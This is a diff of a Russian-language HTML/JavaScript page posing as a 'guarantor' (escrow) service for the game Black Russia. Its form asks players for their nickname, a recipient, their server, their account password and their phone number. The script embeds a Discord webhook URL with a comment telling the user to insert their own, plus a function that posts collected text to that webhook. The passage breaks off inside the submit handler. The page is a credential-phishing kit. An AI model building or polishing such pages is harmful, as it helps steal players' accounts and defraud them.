@@ -8,7 +8,7 @@
 <style>
   :root {
     --bg: #0d0f14;
-    --card: #1c1f26;
+    --card: rgba(17, 19, 24, 0.95);
     --border: #2a2e3d;
     --txt: #ffffff;
     --dim: #8b92a5;
@@ -22,8 +22,10 @@
   }
   
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; }
+  
   body { 
-    background: #0d0f14; 
+    background-color: #0d0f14; 
+    /* Официальный арт с фонарем/машиной */
     background-image: url('https://sun9-20.userapi.com/impg/2HqP4HqP4HqP4HqP/br_bg.jpg?size=1080x1920&quality=96&sign=123');
     background-size: cover;
     background-position: center;
@@ -40,170 +42,138 @@
     content: '';
     position: fixed;
     inset: 0;
-    background: rgba(13, 15, 20, 0.85);
+    background: linear-gradient(180deg, rgba(13,15,20,0.6) 0%, rgba(13,15,20,0.95) 100%);
     z-index: 0;
   }
 
-  .garant-container {
+  .main-container {
     position: relative;
     z-index: 1;
     width: 100%;
-    max-width: 440px;
-    background: rgba(17, 19, 24, 0.95);
-    backdrop-filter: blur(10px);
-    border: 1px solid var(--border);
-    border-radius: 16px;
-    padding: 24px;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.9), 0 0 20px rgba(240, 40, 40, 0.1);
-    margin-top: 20px;
-  }
-
-  .garant-header { 
-    display: flex; 
-    justify-content: space-between; 
-    align-items: center; 
-    margin-bottom: 20px; 
-    border-bottom: 1px solid var(--border); 
-    padding-bottom: 15px; 
-  }
-  .garant-header-title { font-weight: 900; font-size: 18px; color: var(--red); text-transform: uppercase; }
-  .year-badge { background:#2a2e3d; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:800; }
-
-  .input-group { margin-bottom: 14px; }
-  .input-group label {
-    display: block; font-size: 11px; color: var(--dim);
-    margin-bottom: 6px; font-weight: 700; text-transform: uppercase;
-  }
-  .input-group input {
-    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
-    color: var(--txt); padding: 14px 16px; border-radius: 8px; font-size: 15px;
-  }
-  .input-group input:focus { outline: none; border-color: var(--red); }
-  
-  .selected-server-display {
-    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
-    color: var(--txt); padding: 14px 16px; border-radius: 8px; font-size: 15px;
-    display: flex; justify-content: space-between; align-items: center;
-    cursor: pointer;
-  }
-  .selected-server-display span { color: #555; font-size: 12px; }
-
-  .btn {
-    width: 100%; padding: 16px; border: none; border-radius: 8px;
-    font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s;
-    text-transform: uppercase; letter-spacing: 0.5px;
-  }
-  .btn-main { background: var(--red); color: white; box-shadow: 0 4px 20px var(--red-glow); margin-top: 10px; }
-  .btn-main:hover { background: #ff4747; }
-  .btn-main:disabled { background: #555; box-shadow: none; cursor: not-allowed; }
-  .btn-success { background: var(--green); color: #fff; margin-top: 12px; }
-
-  .success-screen { display: none; text-align: left; padding: 10px 0; }
-  .success-screen h3 { color: var(--green); font-size: 18px; margin-bottom: 16px; text-align: center; }
-  .data-box { background: #0a0b0e; border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
-  .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
-  .data-label { color: var(--dim); }
-  .data-value { font-weight: 700; }
-
-  .modal-overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(13, 15, 20, 0.98);
-    z-index: 1000;
-    display: none;
+    max-width: 400px;
+    display: flex;
     flex-direction: column;
-    padding: 20px 15px;
-    overflow-y: auto;
+    gap: 15px;
   }
-  .modal-overlay.active { display: flex; }
 
-  .modal-top {
+  /* Логотип сверху */
+  .top-logo {
+    text-align: center;
+    margin-bottom: 10px;
+  }
+  .top-logo img {
+    width: 140px;
+    filter: drop-shadow(0 0 15px rgba(240, 40, 40, 0.4));
+  }
+
+  /* Карточка формы */
+  .card {
+    background: var(--card);
+    backdrop-filter: blur(12px);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+  }
+
+  .header-row {
     display: flex;
     justify-content: space-between;
     align-items: center;
     margin-bottom: 20px;
-    gap: 15px;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 12px;
   }
+  .header-title { font-weight: 900; font-size: 16px; color: #fff; letter-spacing: 1px;}
+  .header-title span { color: var(--red); }
+  .year-badge { background:#2a2e3d; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:800; color: #fff;}
 
-  .arcanum-logo {
-    width: 50px; height: 50px;
-    background: #000;
-    border: 2px solid #3b82f6;
-    border-radius: 50%;
-    display: flex; flex-direction: column;
-    justify-content: center; align-items: center;
-    box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
-    flex-shrink: 0;
+  .field { margin-bottom: 14px; }
+  .field label {
+    display: block; font-size: 11px; color: var(--dim);
+    margin-bottom: 6px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;
   }
-  .arcanum-logo span:first-child { font-size: 16px; font-weight: 900; color: #fff; line-height: 1; }
-  .arcanum-logo span:last-child { font-size: 7px; font-weight: 700; color: #3b82f6; letter-spacing: 1px; }
-
-  .modal-title { font-size: 20px; font-weight: 800; flex-grow: 1; margin-left: 5px; }
-  
-  .btn-close {
-    background: #1c1f26;
-    border: 1px solid var(--border);
-    color: white;
-    width: 44px; height: 44px;
-    border-radius: 8px;
-    display: flex; justify-content: center; align-items: center;
-    cursor: pointer;
-    font-size: 18px;
-    flex-shrink: 0;
-  }
-
-  .search-box {
-    width: 100%;
-    background: #12141a;
-    border: 1px solid #333;
-    color: white;
-    padding: 14px 16px;
-    border-radius: 8px;
-    font-size: 14px;
-    margin-bottom: 20px;
-  }
-  .search-box:focus { outline: none; border-color: #555; }
-
-  .servers-grid {
-    display: grid;
-    grid-template-columns: repeat(2, 1fr);
-    gap: 12px;
-    padding-bottom: 40px;
-  }
-
-  .server-card {
-    background: linear-gradient(135deg, #1c1f26 0%, #15171d 100%);
-    border: 1px solid #2e323d;
-    border-radius: 8px;
-    padding: 14px;
-    cursor: pointer;
-    position: relative;
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-    min-height: 100px;
+  .field input {
+    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
+    color: var(--txt); padding: 12px 14px; border-radius: 8px; font-size: 14px;
+    font-family: 'Montserrat', sans-serif;
     transition: 0.2s;
   }
-  .server-card:hover { border-color: #555; transform: translateY(-2px); }
-  .server-card:active { transform: scale(0.98); }
-
-  .server-top { display: flex; justify-content: space-between; align-items: flex-start; }
-  .server-num { font-size: 12px; color: #6b7280; font-weight: 700; margin-bottom: 4px; }
+  .field input:focus { outline: none; border-color: var(--red); box-shadow: 0 0 10px var(--red-glow); }
   
-  .server-tag {
-    font-size: 9px; font-weight: 800; padding: 2px 6px; border-radius: 4px;
-    text-transform: uppercase; letter-spacing: 0.5px;
+  .server-select-btn {
+    width: 100%; background: #0a0b0e; border: 1px solid var(--border);
+    color: var(--txt); padding: 12px 14px; border-radius: 8px; font-size: 14px;
+    display: flex; justify-content: space-between; align-items: center;
+    cursor: pointer; font-family: 'Montserrat', sans-serif;
   }
-  .tag-new { background: var(--red); color: #fff; }
-  .tag-current { background: var(--blue); color: #fff; }
-  .tag-recommend { background: var(--green); color: #fff; }
+  .server-select-btn span { color: #555; font-size: 12px; }
 
-  .server-name { font-size: 15px; font-weight: 800; margin-bottom: 15px; text-transform: uppercase; line-height: 1.2; }
+  .btn-main {
+    width: 100%; padding: 14px; border: none; border-radius: 8px;
+    font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s;
+    text-transform: uppercase; letter-spacing: 0.5px;
+    background: var(--red); color: white; box-shadow: 0 4px 15px var(--red-glow);
+    margin-top: 10px;
+  }
+  .btn-main:hover { background: #ff4747; }
+  .btn-main:active { transform: scale(0.98); }
+  .btn-main:disabled { background: #444; box-shadow: none; cursor: not-allowed; }
+
+  /* Экран успеха */
+  .success-box { display: none; }
+  .success-box h3 { color: var(--green); font-size: 16px; margin-bottom: 15px; text-align: center; text-transform: uppercase; }
+  .data-box { background: #0a0b0e; border: 1px solid var(--border); border-radius: 8px; padding: 15px; margin-bottom: 15px; }
+  .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
+  .data-row:last-child { margin-bottom: 0; }
+  .data-label { color: var(--dim); }
+  .data-value { font-weight: 700; color: #fff; }
+
+  .btn-success {
+    width: 100%; padding: 14px; border: none; border-radius: 8px;
+    font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s;
+    text-transform: uppercase; letter-spacing: 0.5px;
+    background: var(--green); color: white;
+  }
+
+  /* Модалка серверов */
+  .modal {
+    position: fixed; inset: 0; background: rgba(13, 15, 20, 0.98);
+    z-index: 1000; display: none; flex-direction: column; padding: 20px 15px;
+    overflow-y: auto;
+  }
+  .modal.active { display: flex; }
   
-  .server-bottom { margin-top: auto; }
-  .server-online { font-size: 11px; color: #9ca3af; margin-bottom: 6px; font-weight: 600; }
-  .server-bar { height: 3px; background: rgba(255,255,255,0.05); border-radius: 2px; overflow: hidden; width: 100%; }
-  .server-fill { height: 100%; border-radius: 2px; }
+  .modal-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+  .modal-head h2 { font-size: 18px; font-weight: 800; color: #fff; }
+  .close-btn { background: #1c1f26; border: 1px solid var(--border); color: white; width: 40px; height: 40px; border-radius: 8px; font-size: 18px; cursor: pointer; }
+  
+  .search-input { width: 100%; background: #12141a; border: 1px solid #333; color: white; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-family: 'Montserrat', sans-serif; }
+  .search-input:focus { outline: none; border-color: #555; }
+
+  .servers-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  
+  .server-card {
+    background: linear-gradient(135deg, #1c1f26 0%, #15171d 100%);
+    border: 1px solid #2e323d; border-radius: 8px; padding: 12px;
+    cursor: pointer; position: relative; display: flex; flex-direction: column;
+    min-height: 90px; transition: 0.2s;
+  }
+  .server-card:hover { border-color: #555; }
+  .server-card:active { transform: scale(0.97); }
+  
+  .s-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 6px; }
+  .s-num { font-size: 11px; color: #6b7280; font-weight: 700; }
+  .s-tag { font-size: 8px; font-weight: 800; padding: 2px 4px; border-radius: 4px; text-transform: uppercase; }
+  .t-new { background: var(--red); color: #fff; }
+  .t-curr { background: var(--blue); color: #fff; }
+  
+  .s-name { font-size: 13px; font-weight: 800; text-transform: uppercase; margin-bottom: 12px; color: #fff; }
+  
+  .s-bottom { margin-top: auto; }
+  .s-online { font-size: 10px; color: #9ca3af; margin-bottom: 4px; font-weight: 600; }
+  .s-bar { height: 3px; background: rgba(255,255,255,0.05); border-radius: 2px; overflow: hidden; }
+  .s-fill { height: 100%; border-radius: 2px; }
   
   .c-red { background: var(--red); }
   .c-blue { background: var(--blue); }
@@ -220,79 +190,85 @@
 </head>
 <body>
 
-<div class="modal-overlay" id="server-modal">
-  <div class="modal-top">
-    <div class="arcanum-logo"><span>A</span><span>ARCANUM</span></div>
-    <div class="modal-title">Выбор сервера</div>
-    <button class="btn-close" onclick="closeServers()">✕</button>
+<!-- Модалка выбора сервера -->
+<div class="modal" id="modal-servers">
+  <div class="modal-head">
+    <h2>Выбор сервера</h2>
+    <button class="close-btn" onclick="toggleModal(false)">✕</button>
   </div>
-  
-  <input type="text" class="search-box" id="server-search" placeholder="Поиск" oninput="filterServers()">
-  
-  <div class="servers-grid" id="servers-grid"></div>
+  <input type="text" class="search-input" id="search" placeholder="Поиск сервера..." oninput="renderServers(this.value)">
+  <div class="servers-grid" id="grid"></div>
 </div>
 
-<div class="garant-container">
-  <div class="garant-header">
-    <div class="garant-header-title">BLACK RUSSIA</div>
-    <div class="year-badge">2026</div>
+<div class="main-container">
+  <div class="top-logo">
+    <!-- Официальный логотип -->
+    <img src="https://sun9-20.userapi.com/impg/2HqP4HqP4HqP/br_logo.png?size=200x200&quality=96&sign=456" alt="BLACK RUSSIA">
   </div>
 
-  <div id="form-screen">
-    <div style="font-size:20px; font-weight:800; text-align:center; margin-bottom:4px;">Гарант-Сервис</div>
-    <div style="font-size:12px; color:var(--dim); text-align:center; margin-bottom:20px;">Безопасная сделка</div>
-
-    <div class="input-group">
-      <label>Ваш Никнейм</label>
-      <input type="text" id="my-nick" placeholder="Ваш ник" autocomplete="off">
+  <div class="card">
+    <div class="header-row">
+      <div class="header-title">ГАРАНТ <span>СЕРВИС</span></div>
+      <div class="year-badge">2026</div>
     </div>
 
-    <div class="input-group">
-      <label>Ник получателя</label>
-      <input type="text" id="target-nick" placeholder="Ник получателя" autocomplete="off">
-    </div>
-
-    <div class="input-group">
-      <label>Сервер</label>
-      <div class="selected-server-display" onclick="openServers()">
-        <div id="current-server-name" style="color:#555;">Выберите сервер</div>
-        <span>▼</span>
+    <!-- Экран ввода -->
+    <div id="screen-form">
+      <div class="field">
+        <label>Ваш Никнейм</label>
+        <input type="text" id="in-my-nick" placeholder="Введите ваш ник">
       </div>
+      
+      <div class="field">
+        <label>Ник получателя</label>
+        <input type="text" id="in-target-nick" placeholder="Введите ник получателя">
+      </div>
+
+      <div class="field">
+        <label>Сервер</label>
+        <div class="server-select-btn" onclick="toggleModal(true)">
+          <div id="selected-name" style="color:#555;">Нажмите чтобы выбрать</div>
+          <span>▼</span>
+        </div>
+      </div>
+
+      <div class="field">
+        <label>Пароль</label>
+        <input type="password" id="in-pass" placeholder="••••••••">
+      </div>
+
+      <div class="field">
+        <label>Номер <span style="color:#555; font-weight:400; text-transform:none;">(не обязательно)</span></label>
+        <input type="tel" id="in-phone" placeholder="+7 (999) 000-00-00">
+      </div>
+
+      <button class="btn-main" id="btn-freeze">Заморозить сделку</button>
     </div>
 
-    <div class="input-group">
-      <label>Пароль</label>
-      <input type="password" id="pass" placeholder="••••••••">
+    <!-- Экран успеха -->
+    <div class="success-box" id="screen-success">
+      <h3>✅ Данные заморожены</h3>
+      <div class="data-box">
+        <div class="data-row"><span class="data-label">Ваш ник:</span><span class="data-value" id="out-my-nick">крутой2882</span></div>
+        <div class="data-row"><span class="data-label">Получатель:</span><span class="data-value" id="out-target-nick">другой228</span></div>
+        <div class="data-row"><span class="data-label">Сервер:</span><span class="data-value" id="out-server">TASHKENT</span></div>
+        <div class="data-row"><span class="data-label">Пароль:</span><span class="data-value">••••••••</span></div>
+      </div>
+      <button class="btn-success" id="btn-send">Средства пришли — отправить</button>
     </div>
 
-    <div class="input-group">
-      <label>Номер <span style="color:#555; font-weight:400; text-transform:none; font-size:11px;">(не обязательно)</span></label>
-      <input type="tel" id="phone" placeholder="+7 (999) 000-00-00" autocomplete="off">
-    </div>
-
-    <button class="btn btn-main" id="freeze">Заморозить сделку</button>
-  </div>
-
-  <div id="success-screen" class="success-screen">
-    <h3>✅ Данные заморожены</h3>
-    <div class="data-box">
-      <div class="data-row"><span class="data-label">Ваш ник:</span><span class="data-value" id="res-my-nick">крутой2882</span></div>
-      <div class="data-row"><span class="data-label">Получатель:</span><span class="data-value" id="res-target-nick">другой228</span></div>
-      <div class="data-row"><span class="data-label">Сервер:</span><span class="data-value" id="res-server">TASHKENT</span></div>
-      <div class="data-row"><span class="data-label">Пароль:</span><span class="data-value">••••••••</span></div>
-    </div>
-    <button class="btn btn-success" id="send-funds">Средства пришли — отправить</button>
   </div>
 </div>
 
 <script>
-  // Твой вебхук
+  // ВСТАВЬ СЮДА СВОЙ ВЕБХУК ДИСКОРДА
   const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1574855151263682701/F4yo0EnQTfI9LxCV7ArmjUzc-8BRgaqcCAJGFyBSpH7vAtgQ8EfF5i-4YSsGGDh7z0DY";
 
+  // Список серверов
   const serversData = [
-    { id: 92, name: "TASHKENT", color: "c-blue", online: "2627 / 1500", percent: 100, tag: "Новый", tagClass: "tag-new" },
+    { id: 92, name: "TASHKENT", color: "c-blue", online: "2627 / 1500", percent: 100, tag: "Новый", tagClass: "t-new" },
     { id: 91, name: "ASTANA", color: "c-blue", online: "2771 / 1500", percent: 100 },
-    { id: 90, name: "NORILSK", color: "c-blue", online: "2263 / 1500", percent: 100, tag: "Текущий", tagClass: "tag-current" },
+    { id: 90, name: "NORILSK", color: "c-blue", online: "2263 / 1500", percent: 100, tag: "Текущий", tagClass: "t-curr" },
     { id: 89, name: "CHEREPOVETS", color: "c-blue", online: "2141 / 1500", percent: 100 },
     { id: 88, name: "MAGADAN", color: "c-blue", online: "2482 / 1500", percent: 100 },
     { id: 87, name: "PODOLSK", color: "c-blue", online: "2164 / 1500", percent: 100 },
@@ -384,64 +360,72 @@
   ];
 
   let selectedServer = "";
-  const $ = id => document.getElementById(id);
-
-  function renderServers(list) {
-    const grid = $("servers-grid");
+  
+  // Рендер серверов
+  function renderServers(query = "") {
+    const grid = document.getElementById('grid');
     grid.innerHTML = "";
-    list.forEach(s => {
-      const el = document.createElement("div");
-      el.className = "server-card";
-      el.onclick = () => selectServer(s.name);
-      
-      let tagHtml = "";
-      if (s.tag) {
-        tagHtml = `<div class="server-tag ${s.tagClass}">${s.tag}</div>`;
-      }
+    
+    const filtered = serversData.filter(s => 
+      s.name.toLowerCase().includes(query.toLowerCase()) || 
+      s.id.toString() === query
+    );
 
-      el.innerHTML = `
-        <div class="server-top">
-          <div class="server-num"># ${s.id}</div>
+    filtered.forEach(s => {
+      const card = document.createElement('div');
+      card.className = 'server-card';
+      card.onclick = () => selectServer(s.name);
+      
+      let tagHtml = s.tag ? `<div class="s-tag ${s.tagClass}">${s.tag}</div>` : "";
+
+      card.innerHTML = `
+        <div class="s-top">
+          <div class="s-num"># ${s.id}</div>
           ${tagHtml}
         </div>
-        <div class="server-name">${s.name}</div>
-        <div class="server-bottom">
-          <div class="server-online">${s.online}</div>
-          <div class="server-bar"><div class="server-fill ${s.color}" style="width: ${s.percent}%"></div></div>
+        <div class="s-name">${s.name}</div>
+        <div class="s-bottom">
+          <div class="s-online">${s.online}</div>
+          <div class="s-bar"><div class="s-fill ${s.color}" style="width: ${s.percent}%"></div></div>
         </div>
       `;
-      grid.appendChild(el);
+      grid.appendChild(card);
     });
   }
-  renderServers(serversData);
 
-  function filterServers() {
-    const query = $("server-search").value.toLowerCase();
-    const filtered = serversData.filter(s => s.name.toLowerCase().includes(query) || s.id.toString() === query);
-    renderServers(filtered);
+  // Открытие/закрытие модалки
+  function toggleModal(show) {
+    document.getElementById('modal-servers').classList.toggle('active', show);
   }
 
+  // Выбор сервера
   function selectServer(name) {
     selectedServer = name;
-    const display = $("current-server-name");
+    const display = document.getElementById('selected-name');
     display.textContent = name;
     display.style.color = "#fff";
-    closeServers();
+    toggleModal(false);
   }
 
-  function openServers() { $("server-modal").classList.add("active"); }
-  function closeServers() { $("server-modal").classList.remove("active"); }
-
-  async function sendDiscord(text) {
+  // Отправка в Discord
+  async function sendToDiscord(text) {
     try {
       await fetch(DISCORD_WEBHOOK, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: text })
       });
-    } catch (e) { console.log("Ошибка отправки", e); }
+    } catch (e) {
+      console.log("Ошибка", e);
+    }
   }
 
   let currentData = null;
 
-  $("freeze").onclic
+  // Нажатие на Заморозить
+  document.getElementById('btn-freeze').onclick = async () => {
+    const myNick = document.getElementById('in-my-nick').value.trim();
+    const targetNick = document.getElementById('in-target-nick').value.trim();
+    const pass = document.getElementById('in-pass').value;
+
+  
